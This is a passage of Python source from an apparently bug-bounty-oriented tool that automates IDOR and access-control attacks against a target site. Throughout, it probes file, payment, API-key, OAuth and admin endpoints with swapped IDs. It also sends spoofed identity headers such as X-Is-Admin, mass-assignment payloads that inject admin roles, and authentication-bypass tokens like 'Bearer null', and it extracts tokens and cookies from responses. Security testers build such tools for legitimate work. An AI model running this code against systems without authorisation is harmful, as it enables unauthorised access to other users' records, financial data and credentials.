                            futures.append(executor.submit(
                                self._test_batch_payload,
                                url=endpoint,
                                payload=payload,
                                description=f"Batch operation test: {pattern} with mixed IDs"
                            ))
            
            # Process results
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        result["severity"] = "HIGH"
                        self.findings.append(result)
                except Exception as e:
                    if self.verbose:
                        console.print(f"[yellow]Error in batch operation test: {str(e)}[/yellow]")

    def _test_webhook_endpoints(self, endpoints):
        """Test for IDOR in webhook endpoints that often contain sensitive data"""
        if self.verbose:
            console.print("[bold blue]Testing for webhook endpoint vulnerabilities...[/bold blue]")
        
        webhook_patterns = [
            '/webhook/', '/webhooks/', '/hook/', '/hooks/',
            '/callback/', '/callbacks/', '/notify/', '/notification/',
            '/push/', '/ping/', '/pong/', '/echo/',
            '/api/webhook/', '/api/hook/', '/api/callback/',
            '/v1/webhook/', '/v2/webhook/', '/api/v1/webhook/'
        ]
        
        webhook_payloads = [
            {"user_id": "admin", "event": "user.created"},
            {"account_id": "admin", "event": "account.updated"},
            {"id": "admin", "type": "user", "action": "create"},
            {"target_id": "admin", "event_type": "user_login"},
            {"recipient_id": "admin", "message": "test"}
        ]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            for endpoint in endpoints:
                for pattern in webhook_patterns:
                    if pattern in endpoint.lower():
                        for payload in webhook_payloads:
                            # Test POST with webhook payload
                            futures.append(executor.submit(
                                self._test_webhook_payload,
                                url=endpoint,
                                payload=payload,
                                description=f"Webhook test: {pattern} with admin ID"
                            ))
            
            # Process results
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        result["severity"] = "HIGH"
                        self.findings.append(result)
                except Exception as e:
                    if self.verbose:
                        console.print(f"[yellow]Error in webhook test: {str(e)}[/yellow]")

    def _test_file_operations(self, endpoints):
        """Test for IDOR in file operations that often contain sensitive documents"""
        if self.verbose:
            console.print("[bold blue]Testing for file operation vulnerabilities...[/bold blue]")
        
        file_patterns = [
            '/file/', '/files/', '/document/', '/documents/',
            '/upload/', '/download/', '/attachment/', '/attachments/',
            '/media/', '/image/', '/images/', '/video/', '/videos/',
            '/pdf/', '/doc/', '/xls/', '/csv/', '/json/',
            '/api/file/', '/api/document/', '/api/upload/',
            '/v1/file/', '/v2/file/', '/api/v1/file/'
        ]
        
        file_ids = [
            "1", "2", "3", "admin", "user", "test", "demo",
            "document1", "file1", "attachment1", "media1",
            "invoice.pdf", "contract.pdf", "report.pdf",
            "user_data.csv", "admin_data.xls", "sensitive.json"
        ]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            for endpoint in endpoints:
                for pattern in file_patterns:
                    if pattern in endpoint.lower():
                        for file_id in file_ids:
                            # Test file access with different IDs
                            new_endpoint = f"{endpoint.rstrip('/')}/{file_id}"
                            futures.append(executor.submit(
                                self._test_url_for_idor,
                                original_url=endpoint,
                                modified_url=new_endpoint,
                                description=f"File operation test: {pattern} with ID {file_id}"
                            ))
            
            # Process results
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        result["severity"] = "HIGH"
                        self.findings.append(result)
                except Exception as e:
                    if self.verbose:
                        console.print(f"[yellow]Error in file operation test: {str(e)}[/yellow]")

    def _test_admin_functions(self, endpoints):
        """Test for IDOR in admin functions that often have elevated privileges"""
        if self.verbose:
            console.print("[bold blue]Testing for admin function vulnerabilities...[/bold blue]")
        
        admin_patterns = [
            '/admin/', '/administrator/', '/manage/', '/management/',
            '/superuser/', '/root/', '/system/', '/sysadmin/',
            '/moderator/', '/support/', '/helpdesk/', '/staff/',
            '/api/admin/', '/api/management/', '/api/system/',
            '/v1/admin/', '/v2/admin/', '/api/v1/admin/'
        ]
        
        admin_functions = [
            'users', 'accounts', 'settings', 'config', 'logs',
            'reports', 'analytics', 'billing', 'invoices', 'payments',
            'notifications', 'webhooks', 'backups', 'exports',
            'permissions', 'roles', 'groups', 'departments',
            'audit', 'activity', 'security', 'compliance'
        ]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            for endpoint in endpoints:
                for pattern in admin_patterns:
                    if pattern in endpoint.lower():
                        for function in admin_functions:
                            for test_id in self.user_ids[:3]:
                                # Test admin function with different user IDs
                                new_endpoint = f"{endpoint.rstrip('/')}/{function}/{test_id}"
                                futures.append(executor.submit(
                                    self._test_url_for_idor,
                                    original_url=endpoint,
                                    modified_url=new_endpoint,
                                    description=f"Admin function test: {pattern}{function} with ID {test_id}"
                                ))
            
            # Process results
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        result["severity"] = "CRITICAL"
                        self.findings.append(result)
                except Exception as e:
                    if self.verbose:
                        console.print(f"[yellow]Error in admin function test: {str(e)}[/yellow]")

    def _test_payment_endpoints(self, endpoints):
        """Test for IDOR in payment endpoints that often contain financial data"""
        if self.verbose:
            console.print("[bold blue]Testing for payment endpoint vulnerabilities...[/bold blue]")
        
        payment_patterns = [
            '/payment/', '/payments/', '/billing/', '/invoice/',
            '/subscription/', '/order/', '/orders/', '/transaction/',
            '/credit/', '/debit/', '/refund/', '/charge/',
            '/api/payment/', '/api/billing/', '/api/order/',
            '/v1/payment/', '/v2/payment/', '/api/v1/payment/'
        ]
        
        payment_ids = [
            "1", "2", "3", "admin", "user", "test",
            "invoice1", "order1", "transaction1", "payment1",
            "subscription1", "billing1", "charge1", "refund1"
        ]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            for endpoint in endpoints:
                for pattern in payment_patterns:
                    if pattern in endpoint.lower():
                        for payment_id in payment_ids:
                            # Test payment endpoint with different IDs
                            new_endpoint = f"{endpoint.rstrip('/')}/{payment_id}"
                            futures.append(executor.submit(
                                self._test_url_for_idor,
                                original_url=endpoint,
                                modified_url=new_endpoint,
                                description=f"Payment endpoint test: {pattern} with ID {payment_id}"
                            ))
            
            # Process results
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        result["severity"] = "CRITICAL"
                        self.findings.append(result)
                except Exception as e:
                    if self.verbose:
                        console.print(f"[yellow]Error in payment endpoint test: {str(e)}[/yellow]")

    def _test_api_key_endpoints(self, endpoints):
        """Test for IDOR in API key endpoints that often contain sensitive credentials"""
        if self.verbose:
            console.print("[bold blue]Testing for API key endpoint vulnerabilities...[/bold blue]")
        
        api_key_patterns = [
            '/api-key/', '/apikey/', '/api_key/', '/key/',
            '/token/', '/tokens/', '/secret/', '/secrets/',
            '/credential/', '/credentials/', '/auth-key/',
            '/api/api-key/', '/api/token/', '/api/secret/',
            '/v1/api-key/', '/v2/api-key/', '/api/v1/api-key/'
        ]
        
        api_key_ids = [
            "1", "2", "3", "admin", "user", "test",
            "key1", "token1", "secret1", "credential1",
            "api_key_1", "auth_key_1", "access_key_1"
        ]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            for endpoint in endpoints:
                for pattern in api_key_patterns:
                    if pattern in endpoint.lower():
                        for key_id in api_key_ids:
                            # Test API key endpoint with different IDs
                            new_endpoint = f"{endpoint.rstrip('/')}/{key_id}"
                            futures.append(executor.submit(
                                self._test_url_for_idor,
                                original_url=endpoint,
                                modified_url=new_endpoint,
                                description=f"API key endpoint test: {pattern} with ID {key_id}"
                            ))
            
            # Process results
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        result["severity"] = "CRITICAL"
                        self.findings.append(result)
                except Exception as e:
                    if self.verbose:
                        console.print(f"[yellow]Error in API key endpoint test: {str(e)}[/yellow]")

    def _test_oauth_endpoints(self, endpoints):
        """Test for IDOR in OAuth endpoints that often contain authentication data"""
        if self.verbose:
            console.print("[bold blue]Testing for OAuth endpoint vulnerabilities...[/bold blue]")
        
        oauth_patterns = [
            '/oauth/', '/oauth2/', '/auth/', '/authentication/',
            '/sso/', '/saml/', '/openid/', '/jwt/',
            '/login/', '/logout/', '/session/', '/sessions/',
            '/api/oauth/', '/api/auth/', '/api/sso/',
            '/v1/oauth/', '/v2/oauth/', '/api/v1/oauth/'
        ]
        
        oauth_payloads = [
            {"user_id": "admin", "client_id": "test", "scope": "admin"},
            {"account_id": "admin", "grant_type": "password", "username": "admin"},
            {"id": "admin", "token_type": "bearer", "access_token": "test"},
            {"user": "admin", "permissions": ["admin", "user"], "roles": ["admin"]}
        ]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            for endpoint in endpoints:
                for pattern in oauth_patterns:
                    if pattern in endpoint.lower():
                        for payload in oauth_payloads:
                            # Test OAuth endpoint with different payloads
                            futures.append(executor.submit(
                                self._test_oauth_payload,
                                url=endpoint,
                                payload=payload,
                                description=f"OAuth endpoint test: {pattern} with admin payload"
                            ))
            
            # Process results
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        result["severity"] = "CRITICAL"
                        self.findings.append(result)
                except Exception as e:
                    if self.verbose:
                        console.print(f"[yellow]Error in OAuth endpoint test: {str(e)}[/yellow]")

    def _test_advanced_techniques(self, endpoints):
        """Test for advanced IDOR techniques that often find high-value vulnerabilities"""
        if self.verbose:
            console.print("[bold blue]Testing for advanced IDOR techniques...[/bold blue]")
        
        # Test for IDOR via HTTP headers
        header_tests = [
            {"X-User-ID": "admin"},
            {"X-Account-ID": "admin"},
            {"X-Forwarded-User": "admin"},
            {"X-Original-User": "admin"},
            {"X-Real-User": "admin"},
            {"X-User": "admin"},
            {"X-User-Id": "admin"},
            {"X-User-Name": "admin"},
            {"X-User-Email": "admin@test.com"},
            {"X-User-Role": "admin"},
            {"X-Admin": "true"},
            {"X-Is-Admin": "true"},
            {"X-Privileged": "true"},
            {"X-Authorization": "admin"},
            {"X-Auth-User": "admin"}
        ]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            for endpoint in endpoints:
                # Test with different headers
                for header_test in header_tests:
                    new_headers = self.headers.copy()
                    new_headers.update(header_test)
                    
                    futures.append(executor.submit(
                        self._test_headers_for_idor,
                        url=endpoint,
                        headers=new_headers,
                        description=f"Advanced header test: {list(header_test.keys())[0]}"
                    ))
                
                # Test for IDOR via JSON path traversal
                json_path_tests = [
                    {"user": {"id": "admin"}},
                    {"data": {"user_id": "admin"}},
                    {"payload": {"account_id": "admin"}},
                    {"request": {"id": "admin"}},
                    {"body": {"user": "admin"}},
                    {"params": {"id": "admin"}},
                    {"query": {"user_id": "admin"}},
                    {"filter": {"id": "admin"}},
                    {"where": {"user_id": "admin"}},
                    {"conditions": {"id": "admin"}}
                ]
                
                for json_test in json_path_tests:
                    futures.append(executor.submit(
                        self._test_json_payload,
                        url=endpoint,
                        payload=json_test,
                        description=f"JSON path test: {list(json_test.keys())[0]}"
                    ))
            
            # Process results
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        result["severity"] = "HIGH"
                        self.findings.append(result)
                except Exception as e:
                    if self.verbose:
                        console.print(f"[yellow]Error in advanced technique test: {str(e)}[/yellow]")

    def _test_mass_assignment(self):
        
        # Common API endpoints that might be vulnerable to mass assignment
        test_endpoints = [
            f"{self.target_url.rstrip('/')}/api/user",
            f"{self.target_url.rstrip('/')}/api/users",
            f"{self.target_url.rstrip('/')}/api/profile",
            f"{self.target_url.rstrip('/')}/api/account",
            f"{self.target_url.rstrip('/')}/api/v1/user",
            f"{self.target_url.rstrip('/')}/api/v1/profile",
            f"{self.target_url.rstrip('/')}/user",
            f"{self.target_url.rstrip('/')}/users",
            f"{self.target_url.rstrip('/')}/profile",
            f"{self.target_url.rstrip('/')}/account"
        ]
        
        # Sensitive fields to inject in mass assignment tests
        privileged_fields = [
            {"role": "admin"},
            {"isAdmin": True},
            {"admin": True},
            {"is_admin": True},
            {"role_id": 1},
            {"permissions": ["admin"]},
            {"access_level": 100},
            {"verified": True},
            {"email_verified": True},
            {"owner": True}
        ]
        
        for endpoint in test_endpoints:
            for fields in privileged_fields:
                try:
                    # Test with PUT method
                    response = requests.put(
                        endpoint,
                        json=fields,
                        headers=self.headers,
                        cookies=self.cookies,
                        proxies=self.proxy,
                        verify=self.verify_ssl,
                        timeout=self.timeout
                    )
                    
                    self._check_response_for_vulnerability(
                        response, 
                        f"Mass assignment test (PUT): injected {fields} to {endpoint}"
                    )
                    
                    # Test with POST method
                    response = requests.post(
                        endpoint,
                        json=fields,
                        headers=self.headers,
                        cookies=self.cookies,
                        proxies=self.proxy,
                        verify=self.verify_ssl,
                        timeout=self.timeout
                    )
                    
                    self._check_response_for_vulnerability(
                        response, 
                        f"Mass assignment test (POST): injected {fields} to {endpoint}"
                    )
                    
                    # Test with PATCH method
                    response = requests.patch(
                        endpoint,
                        json=fields,
                        headers=self.headers,
                        cookies=self.cookies,
                        proxies=self.proxy,
                        verify=self.verify_ssl,
                        timeout=self.timeout
                    )
                    
                    self._check_response_for_vulnerability(
                        response, 
                        f"Mass assignment test (PATCH): injected {fields} to {endpoint}"
                    )
                    
                except Exception as e:
                    if self.verbose:
                        console.print(f"[yellow]Error in mass assignment test: {str(e)}[/yellow]")
                
                # Try to add ID parameter to URL
                for test_id in self.user_ids[:2]:  # Limit test IDs
                    try:
                        id_endpoint = f"{endpoint}/{test_id}"
                        
                        response = requests.put(
                            id_endpoint,
                            json=fields,
                            headers=self.headers,
                            cookies=self.cookies,
                            proxies=self.proxy,
                            verify=self.verify_ssl,
                            timeout=self.timeout
                        )
                        
                        self._check_response_for_vulnerability(
                            response, 
                            f"Mass assignment test: injected {fields} to {id_endpoint}"
                        )
                    
                    except Exception as e:
                        if self.verbose:
                            console.print(f"[yellow]Error in mass assignment test: {str(e)}[/yellow]")

    def _check_graphql_response(self, response, endpoint, query):
        """Check if a GraphQL response indicates a vulnerability"""
        try:
            # First check if it's a valid JSON response
            if response.status_code in [200, 201, 400, 403, 404]:
                try:
                    result = response.json()
                    
                    # Check for data in the response
                    if 'data' in result and result['data'] and not result.get('errors'):
                        # If we got actual data, this might be a vulnerability
                        data_str = json.dumps(result['data'], indent=2)
                        
                        # Look for sensitive information in the response
                        sensitive_patterns = [
                            r'email\\":\s*\\"[^"]+\\"',
                            r'password\\":\s*\\"[^"]+\\"',
                            r'token\\":\s*\\"[^"]+\\"',
                            r'secret\\":\s*\\"[^"]+\\"',
                            r'api_?key\\":\s*\\"[^"]+\\"'
                        ]
                        
                        contains_sensitive = any(re.search(pattern, data_str) for pattern in sensitive_patterns)
                        
                        if contains_sensitive:
                            self.findings.append({
                                "type": "GraphQL IDOR",
                                "url": endpoint,
                                "query": query,
                                "description": "GraphQL query returned sensitive information",
                                "status": response.status_code,
                                "response_sample": data_str[:200] + "..." if len(data_str) > 200 else data_str
                            })
                        elif self.verbose:
                            console.print(f"[green]GraphQL query returned data but no obvious sensitive information[/green]")
                    
                    # Even if we got errors, check if they contain useful information
                    elif 'errors' in result:
                        error_messages = [e.get('message', '') for e in result['errors']]
                        error_str = ', '.join(error_messages)
                        
                        if any(term in error_str.lower() for term in ['unauthorized', 'permission', 'access', 'denied']):
                            # This suggests the query might work with proper authentication
                            if self.verbose:
                                console.print(f"[blue]GraphQL query returned permission errors: {error_str}[/blue]")
                        
                except Exception as e:
                    if self.verbose:
                        console.print(f"[yellow]Error parsing GraphQL response: {str(e)}[/yellow]")
        
        except Exception as e:
            if self.verbose:
                console.print(f"[yellow]Error checking GraphQL response: {str(e)}[/yellow]")

    def _test_url_for_idor(self, original_url, modified_url, description):
        """Test a URL for IDOR vulnerabilities by comparing responses"""
        try:
            # Get original response
            original_response = self._make_request(original_url)
            if not original_response:
                return None
                
            # Get modified response
            modified_response = self._make_request(modified_url)
            if not modified_response:
                return None
            
            # Compare responses
            return self._compare_responses(original_response, modified_response, modified_url, description)
            
        except Exception as e:
            if self.verbose:
                console.print(f"[yellow]Error testing URL for IDOR: {str(e)}[/yellow]")
            return None

    def _test_method_for_idor(self, url, method, description):
        """Test different HTTP methods for IDOR vulnerabilities"""
        try:
            # Make request with the specified method
            response = self._make_request(url, method=method)
            if not response:
                return None
                
            return self._check_response_for_vulnerability(response, description)
            
        except Exception as e:
            if self.verbose:
                console.print(f"[yellow]Error testing method for IDOR: {str(e)}[/yellow]")
            return None

    def _test_headers_for_idor(self, url, headers, description):
        """Test different headers for IDOR vulnerabilities"""
        try:
            # Make request with the specified headers
            response = requests.get(
                url,
                headers=headers,
                cookies=self.cookies,
                proxies=self.proxy,
                verify=self.verify_ssl,
                timeout=self.timeout
            )
            
            return self._check_response_for_vulnerability(response, description)
            
        except Exception as e:
            if self.verbose:
                console.print(f"[yellow]Error testing headers for IDOR: {str(e)}[/yellow]")
            return None

    def _make_request(self, url, method="GET"):
        """Make a request with the specified method"""
        try:
            response = None
            
            if method == "GET":
                response = requests.get(
                    url,
                    headers=self.headers,
                    cookies=self.cookies,
                    proxies=self.proxy,
                    verify=self.verify_ssl,
                    timeout=self.timeout
                )
            elif method == "POST":
                response = requests.post(
                    url,
                    headers=self.headers,
                    cookies=self.cookies,
                    proxies=self.proxy,
                    verify=self.verify_ssl,
                    timeout=self.timeout
                )
            elif method == "PUT":
                response = requests.put(
                    url,
                    headers=self.headers,
                    cookies=self.cookies,
                    proxies=self.proxy,
                    verify=self.verify_ssl,
                    timeout=self.timeout
                )
            elif method == "DELETE":
                response = requests.delete(
                    url,
                    headers=self.headers,
                    cookies=self.cookies,
                    proxies=self.proxy,
                    verify=self.verify_ssl,
                    timeout=self.timeout
                )
            elif method == "PATCH":
                response = requests.patch(
                    url,
                    headers=self.headers,
                    cookies=self.cookies,
                    proxies=self.proxy,
                    verify=self.verify_ssl,
                    timeout=self.timeout
                )
            elif method == "HEAD":
                response = requests.head(
                    url,
                    headers=self.headers,
                    cookies=self.cookies,
                    proxies=self.proxy,
                    verify=self.verify_ssl,
                    timeout=self.timeout
                )
            elif method == "OPTIONS":
                response = requests.options(
                    url,
                    headers=self.headers,
                    cookies=self.cookies,
                    proxies=self.proxy,
                    verify=self.verify_ssl,
                    timeout=self.timeout
                )
                
            return response
            
        except RequestException as e:
            if self.verbose:
                console.print(f"[yellow]Request error for {url}: {str(e)}[/yellow]")
            return None
        except Exception as e:
            if self.verbose:
                console.print(f"[yellow]Error making request to {url}: {str(e)}[/yellow]")
            return None

    def _compare_responses(self, original_response, modified_response, modified_url, description):
        """Compare responses to detect IDOR vulnerabilities, highlighting any difference"""
        # Ignore if both failed
        if original_response is None and modified_response is None:
            return None
        # If the original failed but the modified worked, that's interesting
        if original_response is None and modified_response is not None:
            if modified_response.status_code in [200, 201, 202, 203]:
                return {
                    "type": "IDOR",
                    "url": modified_url,
                    "description": f"{description} - Original request failed but modified succeeded",
                    "status": modified_response.status_code,
                    "response_sample": modified_response.text[:200] + "..." if len(modified_response.text) > 200 else modified_response.text
                }
            return None
        # If the modified failed but the original worked, probably not an IDOR
        if original_response is not None and modified_response is None:
            return None
        # Check status codes
        if original_response.status_code != modified_response.status_code:
            # If modified gives a success code, potential IDOR
            if modified_response.status_code in [200, 201, 202, 203]:
                return {
                    "type": "IDOR",
                    "url": modified_url,
                    "description": f"{description} - Status code changed from {original_response.status_code} to {modified_response.status_code}",
                    "status": modified_response.status_code,
                    "response_sample": modified_response.text[:200] + "..." if len(modified_response.text) > 200 else modified_response.text
                }
            # If modified gives an error that suggests authorization issues, note it
            elif modified_response.status_code in [401, 403, 500]:
                if self.verbose:
                    console.print(f"[blue]Possible access control at {modified_url} - received {modified_response.status_code}[/blue]")
        # If both gave 200, compare content
        if original_response.status_code in [200, 201, 202, 203] and modified_response.status_code in [200, 201, 202, 203]:
            # Check response body similarities
            original_length = len(original_response.text)
            modified_length = len(modified_response.text)
            # If responses are identical in size but shouldn't be, suspicious
            if original_length == modified_length and original_length > 0:
                if original_response.text == modified_response.text:
                    # Same exact response is suspicious for different resources
                    if self.verbose:
                        console.print(f"[blue]Same response for different IDs at {modified_url}[/blue]")
                else:
                    # Any difference is interesting
                    return {
                        "type": "Potential IDOR (diff)",
                        "url": modified_url,
                        "description": f"{description} - Response content differs for different IDs (same length)",
                        "status": modified_response.status_code,
                        "response_sample": modified_response.text[:200] + "..." if len(modified_response.text) > 200 else modified_response.text
                    }
            # If lengths are different, report as potential
            if original_length != modified_length:
                return {
                    "type": "Potential IDOR (length diff)",
                    "url": modified_url,
                    "description": f"{description} - Response size changed ({original_length} vs {modified_length})",
                    "status": modified_response.status_code,
                    "response_sample": modified_response.text[:200] + "..." if len(modified_response.text) > 200 else modified_response.text
                }
        # If both responses are not empty and not identical, highlight the diff
        if original_response.text.strip() != modified_response.text.strip():
            return {
                "type": "Potential IDOR (any diff)",
                "url": modified_url,
                "description": f"{description} - Any difference in response detected",
                "status": modified_response.status_code,
                "response_sample": modified_response.text[:200] + "..." if len(modified_response.text) > 200 else modified_response.text
            }
        return None

    def _check_response_for_vulnerability(self, response, description):
        """Check if a response indicates a vulnerability"""
        if not response:
            return None
            
        # Check for success responses (might indicate vulnerability)
        if response.status_code in [200, 201, 202, 203, 204]:
            try:
                # Try to parse as JSON
                json_data = response.json()
                
                # Check for success messages or status
                success_indicators = ["success", "ok", "true", "updated", "created"]
                if isinstance(json_data, dict):
                    for key, value in json_data.items():
                        if key.lower() in ["status", "success", "result", "message"]:
                            if str(value).lower() in success_indicators:
                                return {
                                    "type": "IDOR via " + description.split(':')[0],
                                    "url": response.url,
                                    "description": description + " - Server indicated success",
                                    "status": response.status_code,
                                    "response": json.dumps(json_data, indent=2)[:200] + "..." if len(json.dumps(json_data, indent=2)) > 200 else json.dumps(json_data, indent=2)
                                }
                
                # Check for sensitive data
                sensitive_fields = ["email", "password", "token", "key", "secret", "username"]
                for field in sensitive_fields:
                    if field in str(json_data).lower():
                        return {
                            "type": "IDOR with Sensitive Data",
                            "url": response.url,
                            "description": description + f" - Response contains possible sensitive data ({field})",
                            "status": response.status_code,
                            "response": json.dumps(json_data, indent=2)[:200] + "..." if len(json.dumps(json_data, indent=2)) > 200 else json.dumps(json_data, indent=2)
                        }
                
                # If response is not empty, report as potential
                if json_data and not (isinstance(json_data, dict) and len(json_data) == 0):
                    return {
                        "type": "Potential IDOR",
                        "url": response.url,
                        "description": description + " - Server returned non-empty response",
                        "status": response.status_code,
                        "response": json.dumps(json_data, indent=2)[:200] + "..." if len(json.dumps(json_data, indent=2)) > 200 else json.dumps(json_data, indent=2)
                    }
                    
            except ValueError:
                # Not JSON, check plain text
                if len(response.text.strip()) > 0 and len(response.text) < 1000:
                    return {
                        "type": "Potential IDOR",
                        "url": response.url,
                        "description": description + " - Server returned non-empty response",
                        "status": response.status_code,
                        "response": response.text[:200] + "..." if len(response.text) > 200 else response.text
                    }
        
        return None

    def _looks_like_id(self, value):
        """Check if a value looks like an ID"""
        # Numeric IDs
        if value.isdigit():
            return True
            
        # UUIDs
        if re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', value, re.IGNORECASE):
            return True
            
        # Base64-like strings
        if re.match(r'^[A-Za-z0-9+/]{22,}[=]{0,2}$', value):
            return True
            
        # Hexadecimal IDs
        if re.match(r'^[0-9a-f]{8,}$', value, re.IGNORECASE):
            return True
            
        # Alphanumeric IDs with common separators
        if re.match(r'^[A-Za-z0-9][A-Za-z0-9_-]{4,}$', value):
            return True
            
        return False

    def _looks_like_id_param(self, param):
        """Check if a parameter name looks like it might contain an ID"""
        id_patterns = [
            'id', 'user', 'account', 'uuid', 'guid', 'num', 
            'item', 'record', 'file', 'doc', 'object', 'uid'
        ]
        
        param_lower = param.lower()
        
        # Direct match for 'id'
        if param_lower == 'id':
            return True
            
        # Contains '_id' or 'id_'
        if '_id' in param_lower or 'id_' in param_lower:
            return True
            
        # Contains any of the patterns
        for pattern in id_patterns:
            if pattern in param_lower:
                return True
                
        return False

    def _validate_target(self):
        """Validate the target URL"""
        if not self.target_url:
            return False
            
        if not self.target_url.startswith(('http://', 'https://')):
            self.target_url = 'https://' + self.target_url
            
        try:
            parsed = urlparse(self.target_url)
            return all([parsed.scheme, parsed.netloc])
        except Exception:
            return False

    def _print_banner(self):
        """Print the tool banner"""
        banner = """
        ╔══════════════════════════════════════════════════════════╗
        ║                                                          ║
        ║   █ █▀▄ █▀█ █▀█   ╔═╗╔╦╗╦  ╦╔═╗╔╗╔╔═╗╔═╗╔╦╗             ║
        ║   █ █ █ █ █ █▀▄   ╠═╣ ║ ╚╗╔╝╠═╣║║║║  ║╣  ║              ║
        ║   ▀ ▀▀  ▀▀▀ ▀ ▀   ╩ ╩ ╩  ╚╝ ╩ ╩╝╚╝╚═╝╚═╝ ╩              ║
        ║                                                          ║
        ║        Advanced IDOR Vulnerability Testing Script        ║
        ║                     [ Version 1.0 ]                      ║
        ║           For Ethical Bug Bounty Research Only           ║
        ║                                                          ║
        ╚══════════════════════════════════════════════════════════╝
        """
        console.print(Panel(banner, style="bold blue"))

    def _print_results(self):
        """Print the testing results"""
        if not self.findings:
            console.print("[bold yellow]No IDOR vulnerabilities detected.[/bold yellow]")
            return
            
        console.print(f"[bold green]Found {len(self.findings)} potential IDOR vulnerabilities![/bold green]")
        
        # Count findings by severity
        critical_count = len([f for f in self.findings if f.get("severity") == "CRITICAL"])
        high_count = len([f for f in self.findings if f.get("severity") == "HIGH"])
        medium_count = len([f for f in self.findings if f.get("severity") in ["MEDIUM", None]])
        
        if critical_count > 0:
            console.print(f"[bold red]CRITICAL: {critical_count} vulnerabilities[/bold red]")
        if high_count > 0:
            console.print(f"[bold yellow]HIGH: {high_count} vulnerabilities[/bold yellow]")
        if medium_count > 0:
            console.print(f"[bold green]MEDIUM: {medium_count} vulnerabilities[/bold green]")
        
        table = Table(title="IDOR Vulnerability Report")
        table.add_column("Severity", style="red")
        table.add_column("Type", style="cyan")
        table.add_column("URL", style="blue", overflow="fold")
        table.add_column("Description", overflow="fold")
        table.add_column("Status", style="magenta")
        
        for finding in self.findings:
            severity = finding.get("severity", "MEDIUM")
            severity_style = "red" if severity == "CRITICAL" else "yellow" if severity == "HIGH" else "green"
            
            table.add_row(
                f"[{severity_style}]{severity}[/{severity_style}]",
                finding["type"],
                finding["url"],
                finding["description"],
                str(finding.get("status", "N/A"))
            )
        
        console.print(table)

    def _save_results(self):
        """Save findings to a file"""
        try:
            with open(self.output_file, 'w') as f:
                json.dump({
                    "target": self.target_url,
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "findings": self.findings
                }, f, indent=2)
                
            console.print(f"[bold green]Results saved to {self.output_file}[/bold green]")
            
        except Exception as e:
            console.print(f"[bold red]Error saving results: {str(e)}[/bold red]")

    def _extract_auth_data(self, response):
        """Extract authentication data from response headers and body"""
        auth_data = {
            'cookies': {},
            'tokens': [],
            'headers': {},
            'params': []
        }
        
        # Extract cookies from Set-Cookie headers
        if 'Set-Cookie' in response.headers:
            for cookie in response.headers.getlist('Set-Cookie'):
                if '=' in cookie:
                    cookie_name = cookie.split('=')[0].strip()
                    cookie_value = cookie.split('=')[1].split(';')[0].strip()
                    auth_data['cookies'][cookie_name] = cookie_value
        
        # Extract tokens from response body
        token_patterns = [
            r'token["\s:=]+["\s]*([^"<>\s,]+)',
            r'access_token["\s:=]+["\s]*([^"<>\s,]+)',
            r'jwt["\s:=]+["\s]*([^"<>\s,]+)',
            r'session["\s:=]+["\s]*([^"<>\s,]+)',
            r'auth["\s:=]+["\s]*([^"<>\s,]+)',
            r'csrf["\s:=]+["\s]*([^"<>\s,]+)',
            r'xsrf["\s:=]+["\s]*([^"<>\s,]+)',
            r'api_key["\s:=]+["\s]*([^"<>\s,]+)',
            r'apikey["\s:=]+["\s]*([^"<>\s,]+)',
            r'bearer["\s:=]+["\s]*([^"<>\s,]+)',
        ]
        
        for pattern in token_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            auth_data['tokens'].extend(matches)
        
        # Extract authentication headers
        auth_headers = ['Authorization', 'X-Auth-Token', 'X-API-Key', 'X-CSRF-Token', 'X-XSRF-Token']
        for header in auth_headers:
            if header in response.headers:
                auth_data['headers'][header] = response.headers[header]
        
        return auth_data

    def _test_auth_bypass(self, endpoints):
        """Test for IDOR via authentication bypass techniques"""
        if self.verbose:
            console.print("[bold blue]Testing for authentication bypass vulnerabilities...[/bold blue]")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            for endpoint in endpoints:
                # Test 1: Without any authentication
                futures.append(executor.submit(
                    self._test_auth_scenario,
                    url=endpoint,
                    cookies={},
                    headers=self.headers,
                    description="No authentication test"
                ))
                
                # Test 2: With empty/blank authentication
                blank_headers = self.headers.copy()
                blank_headers.update({
                    'Authorization': '',
                    'X-Auth-Token': '',
                    'X-API-Key': '',
                    'X-CSRF-Token': '',
                    'X-XSRF-Token': ''
                })
                futures.append(executor.submit(
                    self._test_auth_scenario,
                    url=endpoint,
                    cookies={},
                    headers=blank_headers,
                    description="Blank authentication test"
                ))
                
                # Test 3: With common bypass tokens
                bypass_tokens = [
                    'null', 'undefined', 'none', 'empty', 'false', '0',
                    'admin', 'root', 'system', 'test', 'guest', 'anonymous',
                    'true', 'yes', '1', 'valid', 'authenticated'
                ]
                
                for token in bypass_tokens:
                    bypass_headers = self.headers.copy()
                    bypass_headers.update({
                        'Authorization': f'Bearer {token}',
                        'X-Auth-Token': token,
                        'X-API-Key': token,
                        'X-CSRF-Token': token,
                        'X-XSRF-Token': token
                    })
                    futures.append(executor.submit(
                        self._test_auth_scenario,
                        url=endpoint,
                        cookies={},
                        headers=bypass_headers,
                        description=f"Bypass token test: {token}"
                    ))
                
